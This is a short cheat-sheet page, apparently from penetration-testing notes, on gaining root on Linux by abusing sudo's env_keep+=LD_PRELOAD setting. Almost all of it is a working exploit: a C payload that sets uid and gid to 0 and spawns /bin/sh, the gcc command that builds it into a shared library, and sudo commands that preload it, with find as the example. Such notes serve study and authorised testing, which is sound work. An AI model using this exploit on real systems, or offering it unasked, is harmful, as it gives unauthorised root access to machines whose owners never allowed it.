# Linux Privilege Escalation with LD_PRELOAD
[< Back to Menu](README.md)
## Prerequisite Checking
```bash
sudo -l | grep env
```
- `env_keep+=LD_PRELOAD` should be exposed
## Payload Creation
- Generate this C-code and save to `/tmp`
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```
- Assume I save at `/tmp/shell.c`
- Then, create `shell.so` 
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
```
## Exploitation
- Select any sudo command in `sudo -l`
- It will be good if you can find `(root) NOPASSWD:` so that you won't need user password.
```bash
sudo LD_PRELOAD=/tmp/shell.so <you_selected_sudo_command>
```
- For example, I found `(root) NOPASSWD: /usr/bin/find`
- Then, the exploitation will be
```bash
sudo LD_PRELOAD=/tmp/shell.so find
```